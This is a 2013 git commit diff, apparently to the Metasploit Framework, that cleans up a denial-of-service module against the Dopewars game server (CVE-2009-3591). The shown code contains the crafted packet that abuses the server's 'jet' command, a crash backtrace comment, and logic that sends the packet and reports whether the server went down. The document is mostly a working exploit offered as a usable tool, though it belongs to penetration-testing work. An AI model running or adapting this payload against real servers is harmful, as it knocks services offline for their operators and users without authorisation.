c8c50a64075a66487dbbb7f3976ad10ed013c197
Doug P <dougtko@gmail.com>
2013-03-12 12:56:12 -0400

    cleaned up dopewars module

--- modules/auxiliary/dos/dopewars/dopewars.rb
+++ modules/auxiliary/dos/dopewars/dopewars.rb
@@ -19,10 +19,9 @@ class Metasploit4 < Msf::Auxiliary
 			},
 			'Author'         => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
 			'License'        => MSF_LICENSE,
-			'Version'        => '0.0.1',
+			'Version'        => '0.0.2',
 			'References'     =>
 				[
-					[ 'URL', 'http://www.securityfocus.com/archive/1/archive/1/507012/100/0/threaded' ],
 					[ 'BID', '36606' ],
 					[ 'CVE', 'CVE-2009-3591' ],
 				]))
@@ -31,8 +30,6 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run
-		connect
-
         # The jet command is vulnerable.
         # Program received signal SIGSEGV, Segmentation fault.
         # [Switching to Thread 0xb74916c0 (LWP 30638)]
@@ -40,6 +37,7 @@ class Metasploit4 < Msf::Auxiliary
         # serverside.c:525
         # 525           dopelog(4, LF_SERVER, "%s jets to %s",
         #
+        connect
 		pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
 		print_status("Sending dos packet...")
 		sock.put(pkt)
@@ -52,7 +50,11 @@ class Metasploit4 < Msf::Auxiliary
         rescue ::Interrupt
             raise $!
         rescue ::Rex::ConnectionRefused
-            print_status("Dopewars server succesfully shut down!")
+            print_good("Dopewars server succesfully shut down!")
+        else
+            print_error("DOS attack unsuccessful")
+        ensure
+            disconnect
         end
 	end
 end
